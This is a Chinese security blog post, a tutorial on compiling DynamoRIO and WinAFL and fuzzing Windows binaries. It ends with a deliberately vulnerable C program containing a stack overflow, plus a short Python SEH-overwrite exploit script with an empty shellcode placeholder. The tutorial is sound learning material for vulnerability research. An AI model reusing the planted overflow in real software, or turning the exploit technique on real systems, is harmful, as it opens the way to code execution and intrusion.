<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | 【漏洞挖掘】win-afl使用指北-初级篇</title><meta name="description" content="&lt;p&gt;在21年的时候曾经小小的使用了一点WinAFL，现在再回过头来做笔记&lt;/p&gt;
&lt;p&gt;这里主要讲述WinAFL+DynamoRIO的Fuzz方法&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">【漏洞挖掘】win-afl使用指北-初级篇</h3><div class="article__date metadata"><div class="post-info">2023/07/18</div></div><div class="article__tags metadata">Tags:
<a class="article__tags__link metadata" href="/tags/CVE/">CVE</a><a class="article__tags__link metadata" href="/tags/fuzz/">fuzz</a></div><div class="article__body"><p>在21年的时候曾经小小的使用了一点WinAFL，现在再回过头来做笔记</p>
<p>这里主要讲述WinAFL+DynamoRIO的Fuzz方法</p>
<span id="more"></span>
<h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1>
<p>知道创宇这篇文章讲的已经很好了：<a target="_blank" rel="noopener" href="https://paper.seebug.org/323/">https://paper.seebug.org/323/</a></p>
<p>由于闭源特点，那么需要使用DynamoRIO进行插桩，检测指令块的转移</p>
<p>WinAFL主要特点就是将AFL中的函数使用WinAPI进行重写，然后调用DynamoRIO的API完成fuzz</p>
<h1 id="编译"><a class="markdownIt-Anchor" href="#编译"></a> 编译</h1>
<p>主要是参考了<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-261323.htm%E5%92%8C%E5%AE%98%E6%96%B9%E8%BF%87%E7%A8%8B%EF%BC%9Ahttps://dynamorio.org/page_building.html">https://bbs.kanxue.com/thread-261323.htm和官方过程：https://dynamorio.org/page_building.html</a></p>
<h2 id="dynamorio"><a class="markdownIt-Anchor" href="#dynamorio"></a> DynamoRIO</h2>
<h3 id="32位"><a class="markdownIt-Anchor" href="#32位"></a> 32位</h3>
<h4 id="1-编译"><a class="markdownIt-Anchor" href="#1-编译"></a> 1. 编译</h4>
<p>软件下载一把梭</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/DynamoRIO/dynamorio.git</span><br><span class="line">cd dynamorio</span><br><span class="line">mkdir build_Win32</span><br><span class="line">mkdir build_x64</span><br></pre></td></tr></table></figure>
<p>这里我使用的是<code>x86 Native Tools Command Prompt</code>命令行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake -G&quot;Visual Studio 16&quot; -A Win32 ..</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/77bda948b6a701db350fb235797056e0.png" alt="image-20230719000330825" /></p>
<p>如果发现缺少什么的话，使用<code>set Name=Value</code>再编译，最后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake --build . --config RelWithDebInfo</span><br></pre></td></tr></table></figure>
<h4 id="2-测试"><a class="markdownIt-Anchor" href="#2-测试"></a> 2. 测试</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_win32\bin32\drrun.exe&quot; -t drcov -- &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\32\HelloWorld.exe&quot; &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\32\password.txt&quot;</span><br></pre></td></tr></table></figure>
<p>这里我换成了老版本 dynamorio-cronbuild-8.0.18684，因为新版本是3.0版本的覆盖率文件，IDA Lighthouse只支持2.0，不过你可以通过<a target="_blank" rel="noopener" href="https://gist.github.com/wumb0/de671cc5051353fd32af4aecc811a282%E8%BF%9B%E8%A1%8C%E7%89%88%E6%9C%AC%E7%9A%84%E8%BD%AC%E6%8D%A2%E3%80%82">https://gist.github.com/wumb0/de671cc5051353fd32af4aecc811a282进行版本的转换。</a></p>
<p><img src="https://img.joe1sn.top/uploads/big/47ade84053329cd3875e97c5d3c19562.png" alt="image-20230719081301132" /></p>
<h3 id="64位"><a class="markdownIt-Anchor" href="#64位"></a> 64位</h3>
<h4 id="1-编译-2"><a class="markdownIt-Anchor" href="#1-编译-2"></a> 1. 编译</h4>
<p>按照官方的步骤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%comspec% /k &quot;C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\VC\Auxiliary\Build\vcvarsamd64_x86.bat&quot;</span><br></pre></td></tr></table></figure>
<p>或者启动</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Developer Command Prompt for VS 2019</span><br></pre></td></tr></table></figure>
<p>然后进行cmake配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake -A x64 ..</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/0e10d36abf96b93682871ec08ace8fa9.png" alt="image-20230719081540005" /></p>
<p>就可以参考看雪那篇文章修改下报错</p>
<p>利用cmake-gui修改完过后就可以继续回到cmd进行编译了（也可以用vs2019）</p>
<p><img src="https://img.joe1sn.top/uploads/big/f3984b961053db86e86b2e2056e66173.png" alt="image-20230719081913889" /></p>
<h4 id="2-测试-2"><a class="markdownIt-Anchor" href="#2-测试-2"></a> 2. 测试</h4>
<p><img src="https://img.joe1sn.top/uploads/big/e212aa65d03465a205a2b64ff66ea06d.png" alt="image-20230719082924046" /></p>
<h2 id="winafl"><a class="markdownIt-Anchor" href="#winafl"></a> WinAFL</h2>
<p>起手式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/googleprojectzero/winafl.git</span><br><span class="line">cd winafl</span><br><span class="line">git submodule update --init --recursive</span><br><span class="line">mkdir build_Win32</span><br><span class="line">mkdir build_x64</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>编译32位</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake -G&quot;Visual Studio 16 2019&quot; .. -A Win32 -DDynamoRIO_DIR=D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\cmake -DINTELPT=1 -DUSE_COLOR=1</span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure>
<p>如果显示<code>drgui</code>不完整，返回去在生成就行了，看雪上的教程是没有问题的</p>
</li>
<li>
<p>编译64位</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake -G&quot;Visual Studio 16 2019&quot; -A x64 .. -DDynamoRIO_DIR=&quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_x64\cmake&quot; -DINTELPT=1 -DUSE_COLOR=1</span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h1>
<h2 id="32位-2"><a class="markdownIt-Anchor" href="#32位-2"></a> 32位</h2>
<ol>
<li>
<p>首先进行插桩</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">:: 接受用户输入</span><br><span class="line"><span class="built_in">set</span> /p target_module=traget excutable : </span><br><span class="line"><span class="built_in">set</span> /p target_offset=traget offset : </span><br><span class="line"><span class="built_in">set</span> /p sample=pins sample: </span><br><span class="line"></span><br><span class="line">:: 输出用户输入的内容</span><br><span class="line"><span class="built_in">echo</span> target_module, <span class="variable">%target_module%</span>!</span><br><span class="line"><span class="built_in">echo</span> target_offset, <span class="variable">%target_offset%</span>!</span><br><span class="line"><span class="built_in">echo</span> sample, <span class="variable">%sample%</span>!</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">D:\<span class="title">HackTools</span>\<span class="title">Fuzz</span>\<span class="title">__FuzzWork</span>\<span class="title">dynamorio</span>\<span class="title">build_Win32</span>\<span class="title">bin32</span>\<span class="title">drrun.exe</span> ^</span></span><br><span class="line"><span class="function">-<span class="title">c</span> <span class="title">D</span>:\<span class="title">HackTools</span>\<span class="title">Fuzz</span>\<span class="title">__FuzzWork</span>\<span class="title">winafl</span>\<span class="title">build_Win32</span>\<span class="title">bin</span>\<span class="title">Release</span>\<span class="title">winafl.dll</span> -<span class="title">debug</span> ^</span></span><br><span class="line"><span class="function">-<span class="title">target_module</span> %<span class="title">target_module</span>% ^</span></span><br><span class="line"><span class="function">-<span class="title">target_offset</span> %<span class="title">target_offset</span>% ^</span></span><br><span class="line"><span class="function">-<span class="title">fuzz_iterations</span> 10 -<span class="title">nargs</span> 2 -- ^</span></span><br><span class="line"><span class="function">%<span class="title">target_module</span>% %<span class="title">sample</span>%</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe ^</span><br><span class="line">-c D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release\winafl.dll -debug ^</span><br><span class="line">-target_module test.exe ^</span><br><span class="line">-target_offset 0x1210 ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 -- ^</span><br><span class="line">test.exe .\in\password.txt</span><br></pre></td></tr></table></figure>
<p>查看生成的log文件，如果有<code>Everything appears to be running normally.</code>那么就是完成了</p>
</li>
<li>
<p>开始fuzz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i .\in ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\out&quot; ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module test.exe ^</span><br><span class="line">-target_module test.exe ^</span><br><span class="line">-target_offset 0x1210 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 1 -- ^</span><br><span class="line">test.exe @@</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/ea80329361bc5efe5305e79b94370480.png" alt="image-20230719131211815" /></p>
</li>
</ol>
<h2 id="64位-2"><a class="markdownIt-Anchor" href="#64位-2"></a> 64位</h2>
<p>过程也差不多</p>
<p>先插桩</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">traget excutable : test.exe</span><br><span class="line">traget offset : 0x1200</span><br><span class="line">pins sample: .\in\input.bmp</span><br><span class="line">target_module, test.exe!</span><br><span class="line">target_offset, 0x1200!  </span><br><span class="line">sample, .\in\input.bmp!</span><br></pre></td></tr></table></figure>
<p>然后fuzz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i .\in ^</span><br><span class="line">-o .\out ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_x64\bin64&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module test.exe ^</span><br><span class="line">-target_module test.exe ^</span><br><span class="line">-target_offset 0x1210 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 1 -- ^</span><br><span class="line">test.exe @@</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/916e80cff30a0ee3d94ceca18eb32ad4.png" alt="image-20230719134046975" /></p>
<h1 id="测试2-simplehunt"><a class="markdownIt-Anchor" href="#测试2-simplehunt"></a> 测试2 - SimpleHunt</h1>
<p>在之前我的博客写了windows下栈溢出的过程，这里我改写了下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>	</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hacked\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *FileDir)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line">	<span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">	FILE *fp;</span><br><span class="line">	<span class="keyword">if</span>(!(fp=fopen(FileDir,<span class="string">&quot;r&quot;</span>)))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Open Failed\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fgets(str, <span class="number">0x1000</span>, fp);</span><br><span class="line"></span><br><span class="line">	str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line">		<span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	vuln(argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc HelloWorld.c -o HelloWorld</span><br></pre></td></tr></table></figure>
<p>没有任何保护，这里以32位举例</p>
<h2 id="fuzz"><a class="markdownIt-Anchor" href="#fuzz"></a> fuzz</h2>
<p>由于代码比较简单，不需要先生成覆盖率文件找到关键函数，所以首先还是插桩</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe ^</span><br><span class="line">-c D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release\winafl.dll -debug ^</span><br><span class="line">-target_module HelloWorld.exe ^</span><br><span class="line">-target_offset 0x16c4 ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 -- ^</span><br><span class="line">HelloWorld.exe in\password.txt</span><br></pre></td></tr></table></figure>
<p>开始fuzz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i &quot;D:\HackTools\Fuzz\WinAFLFuzz\in&quot; ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\out&quot; ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module HelloWorld.exe ^</span><br><span class="line">-target_module HelloWorld.exe ^</span><br><span class="line">-target_offset 0x16c4 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 2 -- ^</span><br><span class="line">HelloWorld.exe @@</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/ec9214e2a5aada0ddc6e74f956f60bf9.png" alt="image-20230719140624246" /></p>
<p>瞬间找到一个crash</p>
<h2 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> PoC</h2>
<p><img src="https://img.joe1sn.top/uploads/big/80b03780c4fcd5ad58467691a3664471.png" alt="image-20230719140746701" /></p>
<p>使用x32dbg进行调试</p>
<p><img src="https://img.joe1sn.top/uploads/big/ce1aa16c4a51fe8d5fe578c891edc509.png" alt="image-20230719141111547" /></p>
<p>刚好修改了EBP寄存器导出错误，很明显的栈溢出。</p>
<p>具体的EXP构造方法就是使用SEH加载shellcode，具体的在之前的文章已经写过了</p>
<p>写出exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x12c</span>-<span class="built_in">len</span>(shellcode)-<span class="number">32</span>) <span class="comment">#0x1c</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\x9A\x24\x40\x00&quot;</span>    <span class="comment">#40249A</span></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x24\x06\x00\x00\xFF\xE0&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">32</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>
<p><img src="https://img.joe1sn.top/uploads/big/04b0986fd3905d3622d739c4a5e3813d.gif" alt="output" /></p>
<h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/323/">https://paper.seebug.org/323/</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-261323.htm">https://bbs.kanxue.com/thread-261323.htm</a></p>
</div></article><section class="comments"><div id="disqus_thread"></div><script>var disqus_shortname = 'disqus';
(function () {
  var dsq = document.createElement('script');
  dsq.type = 'text/javascript';
  dsq.async = true;
  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();</script><script id="dsq-count-scr" src="//#{theme.disqus}.disqus.com/count.js" async></script></section><div class="pagination"><a class="pagination__link pagination__prev" href="/2023/07/19/win-afl2/">prev_post</a><a class="pagination__link pagination__next" href="/2023/07/17/dll-injector/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2023 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>